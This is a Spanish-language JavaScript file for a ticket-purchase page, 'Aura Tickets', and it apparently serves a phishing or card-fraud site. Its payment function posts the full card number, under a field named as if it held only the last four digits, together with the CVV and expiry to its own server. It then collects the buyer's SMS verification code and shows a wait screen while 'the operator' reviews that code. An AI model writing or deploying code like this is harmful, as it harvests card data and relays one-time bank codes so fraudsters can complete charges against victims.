// ============================== AURA TICKETS - SCRIPT CORREGIDO ==============================

const CONFIG = {
  TAX_RATE: 0.19,
  CODE_TIMEOUT: 300,
  NOTIFICATION_TIMEOUT: 3000,
  PAYMENT_ENDPOINTS: {
    PROCESS: '/comprar',
    VERIFY_CODE: '/codigo'
  }
};

const AppState = {
  selectedZone: null,
  selectedPrice: 0,
  quantity: 1,
  buyerName: '',
  buyerEmail: '',
  buyerPhone: '',
  paymentInProgress: false,
  transactionId: '',

  reset() {
    this.selectedZone = null;
    this.selectedPrice = 0;
    this.quantity = 1;
    this.buyerName = '';
    this.buyerEmail = '';
    this.buyerPhone = '';
    this.paymentInProgress = false;
    this.transactionId = '';
  },

  getTotals() {
    const subtotal = this.quantity * this.selectedPrice;
    const tax = Math.round(subtotal * CONFIG.TAX_RATE);
    const total = subtotal + tax;
    return { subtotal, tax, total };
  }
};

const $ = (id) => document.getElementById(id);

let DOM = {};

function resolveDOM() {
  DOM = {
    zonas: document.querySelectorAll('.zona'),
    cantidad: $('cantidad'),
    nombre: $('nombre'),
    correo: $('correo'),
    precio: $('precio'),
    cant: $('cant'),
    subtotal: $('subtotal'),
    impuesto: $('impuesto'),
    total: $('total'),
    totalQuick: $('total-quick'),
    zonaSummary: $('zona-summary'),
    btnComprar: $('btnComprar'),
    modalCompra: $('modalCompra'),
    modalFactura: $('modalFactura'),
    modalSMS: $('modalSMS'),
    modalSuccess: $('modalSuccess'),
    mZona: $('mZona'),
    mCantidad: $('mCantidad'),
    mTotal: $('mTotal'),
    fNombre: $('fNombre'),
    fEmail: $('fEmail'),
    fTelefono: $('fTelefono'),
    fDireccion: $('fDireccion'),
    fCard: $('fCard'),
    fExpiry: $('fExpiry'),
    fCVV: $('fCVV'),
    fZona: $('fZona'),
    fCantidad: $('fCantidad'),
    fSubtotal: $('fSubtotal'),
    fImpuesto: $('fImpuesto'),
    fTotal: $('fTotal'),
    codigoSMS: $('codigoSMS'),
    contador: $('contador'),
    successTransactionId: $('successTransactionId'),
    successZona: $('successZona'),
    successCantidad: $('successCantidad'),
    loader: $('loader')
  };
}

// ============ UTILITIES ============
function validEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validPhone(phone) {
  const cleaned = phone.replace(/\D/g, '');
  return cleaned.length >= 7 && cleaned.length <= 15;
}

function validCardNumber(cardNumber) {
  const cleaned = cardNumber.replace(/\D/g, '');
  if (cleaned.length < 13 || cleaned.length > 19) return false;
  let sum = 0, isEven = false;
  for (let i = cleaned.length - 1; i >= 0; i--) {
    let digit = parseInt(cleaned[i], 10);
    if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function validExpiry(expiry) {
  const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
  if (!regex.test(expiry)) return false;
  const [month, year] = expiry.split('/');
  const now = new Date();
  const currentYear = now.getFullYear() % 100;
  const currentMonth = now.getMonth() + 1;
  const expiryYear = parseInt(year, 10);
  const expiryMonth = parseInt(month, 10);
  if (expiryYear < currentYear) return false;
  if (expiryYear === currentYear && expiryMonth < currentMonth) return false;
  return true;
}

function validCVV(cvv) { return /^\d{3,4}$/.test(cvv); }

function formatCurrency(value) { 
  return new Intl.NumberFormat('es-ES').format(value || 0); 
}

function notify(msg) { 
  // Usar alert temporalmente, puedes reemplazar con toast más adelante
  alert(msg); 
}

// ============ SUMMARY ============
function updateSummary() {
  if (!AppState.selectedZone) { 
    if (DOM.btnComprar) DOM.btnComprar.disabled = true; 
    return; 
  }
  
  AppState.quantity = parseInt(DOM.cantidad?.value || 1);
  const { subtotal, tax, total } = AppState.getTotals();
  
  if (DOM.precio) DOM.precio.textContent = formatCurrency(AppState.selectedPrice);
  if (DOM.cant) DOM.cant.textContent = AppState.quantity;
  if (DOM.subtotal) DOM.subtotal.textContent = formatCurrency(subtotal);
  if (DOM.impuesto) DOM.impuesto.textContent = formatCurrency(tax);
  if (DOM.total) DOM.total.textContent = formatCurrency(total);
  if (DOM.totalQuick) DOM.totalQuick.textContent = formatCurrency(total);
  if (DOM.zonaSummary) DOM.zonaSummary.textContent = AppState.selectedZone;
  
  validateAndToggleBtn();
}

function validateAndToggleBtn() {
  const name = DOM.nombre ? DOM.nombre.value.trim() : '';
  const email = DOM.correo ? DOM.correo.value.trim() : '';
  const hasZone = !!AppState.selectedZone;
  const hasName = name.length >= 3;
  const hasEmail = validEmail(email);
  
  if (DOM.btnComprar) {
    DOM.btnComprar.disabled = !(hasZone && hasName && hasEmail);
  }
}

// ============ ZONE SELECTION ============
function selectZone(el) {
  const zonaName = el.getAttribute('data-zona') || 
                   el.querySelector('.zona-name')?.textContent || 
                   'Zona';
  const zonaPrice = parseInt(el.getAttribute('data-precio') || 
                             el.querySelector('.zona-price')?.textContent?.replace('$', '') || 
                             0);
  const selectedGroup = zonaName.trim().toLowerCase();

  // Remover selección de zonas
  document.querySelectorAll('.zona').forEach(z => {
    z.classList.remove('active', 'activa');
    z.setAttribute('aria-checked', 'false');
  });
  
  // Remover selección de price-items
  document.querySelectorAll('.price-item').forEach(item => {
    item.classList.remove('selected');
  });
  
  document.querySelectorAll('.zona').forEach(z => {
    const zoneGroup = (z.getAttribute('data-zona') || z.querySelector('.zona-name')?.textContent || '').trim().toLowerCase();
    if (zoneGroup === selectedGroup) {
      z.classList.add('active', 'activa');
      z.setAttribute('aria-checked', 'true');
    }
  });

  document.querySelectorAll('.price-item').forEach(item => {
    const itemGroup = (item.getAttribute('data-zona') || item.querySelector('.price-name')?.textContent || '').trim().toLowerCase();
    if (itemGroup === selectedGroup) {
      item.classList.add('selected');
    }
  });
  
  AppState.selectedZone = zonaName;
  AppState.selectedPrice = zonaPrice;
  
  updateSummary();
}

window.selectZone = selectZone;

// ============ VALIDATION ============
function validateBuyer() {
  const name = DOM.nombre?.value.trim() || '';
  const email = DOM.correo?.value.trim() || '';
  
  if (name.length < 3) { 
    notify('❌ Nombre inválido (mín. 3 caracteres)'); 
    DOM.nombre?.focus(); 
    return false; 
  }
  
  if (!validEmail(email)) { 
    notify('❌ Email inválido'); 
    DOM.correo?.focus(); 
    return false; 
  }
  
  AppState.buyerName = name;
  AppState.buyerEmail = email;
  return true;
}

function validatePaymentForm() {
  const errors = [];
  const nombre = DOM.fNombre?.value.trim() || '';
  const email = DOM.fEmail?.value.trim() || '';
  const telefono = DOM.fTelefono?.value.trim() || '';
  const direccion = DOM.fDireccion?.value.trim() || '';
  const cardNum = DOM.fCard?.value.trim() || '';
  const expiry = DOM.fExpiry?.value.trim() || '';
  const cvv = DOM.fCVV?.value.trim() || '';
  
  if (nombre.length < 3) errors.push('Nombre inválido (mín. 3 caracteres)');
  if (!validEmail(email)) errors.push('Email inválido');
  if (!validPhone(telefono)) errors.push('Teléfono inválido');
  if (direccion.length < 5) errors.push('Dirección inválida');
  if (!validCardNumber(cardNum)) errors.push('Número de tarjeta inválido');
  if (!validExpiry(expiry)) errors.push('Fecha de vencimiento inválida (MM/AA)');
  if (!validCVV(cvv)) errors.push('CVV inválido (3-4 dígitos)');
  
  if (errors.length > 0) { 
    notify('❌ Errores:\n\n' + errors.join('\n')); 
    return false; 
  }
  
  AppState.buyerPhone = telefono;
  return true;
}

// ============ MODALS ============
function openModal(modal) {
  if (!modal) return;
  document.querySelectorAll('.modal').forEach(m => {
    m.classList.remove('show');
    m.setAttribute('aria-hidden', 'true');
  });
  modal.classList.add('show');
  modal.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
  if (window.lucide) lucide.createIcons();
}

function closeModal(modal) {
  if (!modal) return;
  modal.classList.remove('show');
  modal.setAttribute('aria-hidden', 'true');
  document.body.style.overflow = '';
}

// ============ FLUJO COMPRAR ============
window.comprar = function () {
  if (!AppState.selectedZone) { 
    notify('❌ Selecciona una zona'); 
    return; 
  }
  if (!validateBuyer()) return;
  
  const { total } = AppState.getTotals();
  if (DOM.mZona) DOM.mZona.textContent = AppState.selectedZone;
  if (DOM.mCantidad) DOM.mCantidad.textContent = AppState.quantity;
  if (DOM.mTotal) DOM.mTotal.textContent = formatCurrency(total);
  
  openModal(DOM.modalCompra);
};

window.confirmarCompra = function () {
  const { subtotal, tax, total } = AppState.getTotals();
  
  // Prellenar datos del comprador en el modal de pago
  if (DOM.fNombre) DOM.fNombre.value = AppState.buyerName;
  if (DOM.fEmail) DOM.fEmail.value = AppState.buyerEmail;
  if (DOM.fZona) DOM.fZona.textContent = AppState.selectedZone;
  if (DOM.fCantidad) DOM.fCantidad.textContent = AppState.quantity;
  if (DOM.fSubtotal) DOM.fSubtotal.textContent = formatCurrency(subtotal);
  if (DOM.fImpuesto) DOM.fImpuesto.textContent = formatCurrency(tax);
  if (DOM.fTotal) DOM.fTotal.textContent = formatCurrency(total);
  
  closeModal(DOM.modalCompra);
  openModal(DOM.modalFactura);
};

// ============ FLUJO PAGAR ============
let counterInterval = null;

window.procesarPago = async function () {
  if (AppState.paymentInProgress) return;
  if (!validatePaymentForm()) return;
  
  AppState.paymentInProgress = true;
  if (DOM.loader) DOM.loader.classList.add('show');
  
  try {
    const { total } = AppState.getTotals();
    const payload = {
      zona: AppState.selectedZone,
      cantidad: AppState.quantity,
      total: total,
      nombre: DOM.fNombre?.value.trim() || '',
      correo: DOM.fEmail?.value.trim() || AppState.buyerEmail,
      telefono: DOM.fTelefono?.value.trim() || '',
      direccion: DOM.fDireccion?.value.trim() || '',
      tarjeta_ultimos4: (DOM.fCard?.value || '').replace(/\D/g, ''),
      vencimiento: DOM.fExpiry?.value.trim() || '',
      cvv: DOM.fCVV?.value.trim() || ''
    };
    
    // CORREGIDO: Usar fetch con manejo de errores mejorado
    const response = await fetch(CONFIG.PAYMENT_ENDPOINTS.PROCESS, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    const responseData = await response.json();
    
    if (!response.ok) {
      throw new Error(responseData.error || responseData.message || 'Error procesando pago');
    }
    
    AppState.transactionId = responseData.transaction_id;
    closeModal(DOM.modalFactura);
    openModal(DOM.modalSMS);
    
    // Iniciar contador
    let sec = CONFIG.CODE_TIMEOUT;
    if (counterInterval) clearInterval(counterInterval);
    if (DOM.contador) DOM.contador.textContent = `⏱️ Ingresa el código que recibiste por SMS... ${sec}s`;
    
    counterInterval = setInterval(() => {
      sec--;
      if (sec <= 0) {
        if (DOM.contador) DOM.contador.textContent = '⚠️ Código expirado. Reinicia el proceso.';
        clearInterval(counterInterval);
        return;
      }
      if (DOM.contador) DOM.contador.textContent = `⏱️ Ingresa el código que recibiste por SMS... ${sec}s`;
    }, 1000);
    
  } catch (error) {
    console.error('Error en procesarPago:', error);
    notify(`❌ ${error.message}`);
  } finally {
    if (DOM.loader) DOM.loader.classList.remove('show');
    AppState.paymentInProgress = false;
  }
};

// ============ FLUJO CÓDIGO ============
window.validarCodigo = async function () {
  const code = DOM.codigoSMS?.value.trim() || '';
  
  if (code.length !== 6 || !/^\d{6}$/.test(code)) {
    notify('❌ El código debe tener exactamente 6 dígitos');
    return;
  }
  
  if (DOM.loader) DOM.loader.classList.add('show');
  
  try {
    const response = await fetch(CONFIG.PAYMENT_ENDPOINTS.VERIFY_CODE, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        transaction_id: AppState.transactionId, 
        codigo: code 
      })
    });
    
    const responseData = await response.json();
    
    if (!response.ok) {
      throw new Error(responseData.message || 'Error al enviar el código');
    }
    
    if (counterInterval) clearInterval(counterInterval);
    closeModal(DOM.modalSMS);
    mostrarEsperaConfirmacion();
    
  } catch (error) {
    console.error('Error en validarCodigo:', error);
    notify(`❌ ${error.message}`);
  } finally {
    if (DOM.loader) DOM.loader.classList.remove('show');
  }
};

// ============ ESPERA CONFIRMACIÓN ============
let pollingInterval = null;

function mostrarEsperaConfirmacion() {
  if (DOM.successTransactionId) DOM.successTransactionId.textContent = AppState.transactionId;
  if (DOM.successZona) DOM.successZona.textContent = AppState.selectedZone;
  if (DOM.successCantidad) DOM.successCantidad.textContent = AppState.quantity;
  
  const successTitle = document.getElementById('modalSuccessTitle');
  const successMsg = document.querySelector('.success-message');
  
  if (successTitle) successTitle.textContent = '⏳ Esperando aprobación...';
  if (successMsg) successMsg.textContent = 'El operador está revisando tu código. Esto puede tardar unos segundos.';
  
  openModal(DOM.modalSuccess);
  
  if (pollingInterval) clearInterval(pollingInterval);
  pollingInterval = setInterval(() => pollEstado(AppState.transactionId), 3000);
}

async function pollEstado(tx_id) {
  if (!tx_id) return;
  
  try {
    const response = await fetch(`/estado/${tx_id}`);
    const data = await response.json();
    
    if (data.status === 'approved') {
      clearInterval(pollingInterval);
      // Redirigir a la página de confirmación
      window.location.href = `/confirmacion/${tx_id}`;
      
    } else if (data.status === 'rejected') {
      clearInterval(pollingInterval);
      window.location.href = `/rechazo/${tx_id}`;
      
    } else if (data.status === 'expired' || data.status === 'not_found') {
      clearInterval(pollingInterval);
      closeModal(DOM.modalSuccess);
      notify('⚠️ La sesión expiró. Por favor inicia el proceso nuevamente.');
      AppState.reset();
    }
    // 'pending' → seguimos esperando
    
  } catch (error) {
    console.error('Polling error:', error);
  }
}

function mostrarCompraConfirmada(data) {
  const successTitle = document.getElementById('modalSuccessTitle');
  const successMsg = document.querySelector('.success-message');
  
  if (successTitle) successTitle.textContent = '¡Compra confirmada! ✅';
  if (successMsg) successMsg.textContent = 'Tu entrada fue procesada exitosamente y se envió a tu correo.';
  if (DOM.successTransactionId) DOM.successTransactionId.textContent = AppState.transactionId;
  if (DOM.successZona) DOM.successZona.textContent = data.zona || AppState.selectedZone;
  if (DOM.successCantidad) DOM.successCantidad.textContent = data.cantidad || AppState.quantity;
}

// ============ CERRAR MODALS ============
window.cerrarModal = () => closeModal(DOM.modalCompra);
window.cerrarFactura = () => closeModal(DOM.modalFactura);
window.cerrarSMS = () => {
  if (counterInterval) clearInterval(counterInterval);
  closeModal(DOM.modalSMS);
};
window.cerrarSuccess = () => { 
  if (pollingInterval) clearInterval(pollingInterval);
  closeModal(DOM.modalSuccess); 
  AppState.reset();
  // Recargar la página o resetear UI
  if (DOM.btnComprar) DOM.btnComprar.disabled = true;
};

// ============ CARD FORMATTING ============
function formatCardInput(input) {
  let value = input.value.replace(/\D/g, '');
  let formatted = '';
  for (let i = 0; i < value.length; i += 4) {
    if (i > 0) formatted += ' ';
    formatted += value.substr(i, 4);
  }
  input.value = formatted;
}

function formatExpiryInput(input) {
  let value = input.value.replace(/\D/g, '');
  if (value.length >= 2) {
    value = value.substr(0, 2) + '/' + value.substr(2, 2);
  }
  input.value = value.substr(0, 5);
}

// ============ INIT ============
function init() {
  resolveDOM();
  if (window.aplicarTextosEditables) window.aplicarTextosEditables();
  
  if (!DOM.zonas || DOM.zonas.length === 0) {
    console.warn('No se encontraron zonas');
    return;
  }
  
  // Event listeners para zonas
  DOM.zonas.forEach(z => {
    z.addEventListener('click', () => selectZone(z));
    z.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') { 
        e.preventDefault(); 
        selectZone(z); 
      }
    });
  });
  
  // Event listeners para price-item en el panel derecho
  document.querySelectorAll('.price-item').forEach(item => {
    item.addEventListener('click', () => selectZone(item));
    item.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        selectZone(item);
      }
    });
  });
  
  // Desactivar el delegado global, evita dobles llamadas al hacer clic en zonas
  // document.addEventListener('click', (e) => {
  //   const selectable = e.target.closest('.zona, .price-item');
  //   if (!selectable) return;
  //   selectZone(selectable);
  // });
  
  // Event listeners para inputs
  if (DOM.cantidad) DOM.cantidad.addEventListener('change', updateSummary);
  if (DOM.nombre) DOM.nombre.addEventListener('input', validateAndToggleBtn);
  if (DOM.correo) DOM.correo.addEventListener('input', validateAndToggleBtn);
  
  // Formateo de tarjeta
  if (DOM.fCard) {
    DOM.fCard.addEventListener('input', function() { 
      formatCardInput(this); 
    });
  }
  
  if (DOM.fExpiry) {
    DOM.fExpiry.addEventListener('input', function() { 
      formatExpiryInput(this); 
    });
  }
  
  if (DOM.fCVV) {
    DOM.fCVV.addEventListener('input', function() { 
      this.value = this.value.replace(/\D/g, '').substr(0, 4); 
    });
  }
  
  // Cerrar modales con ESC
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      document.querySelectorAll('.modal.show').forEach(m => closeModal(m));
    }
  });
  
  console.log('✅ Aura Tickets iniciado correctamente');
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
  if (window.lucide) {
    lucide.createIcons();
  }
  init();
});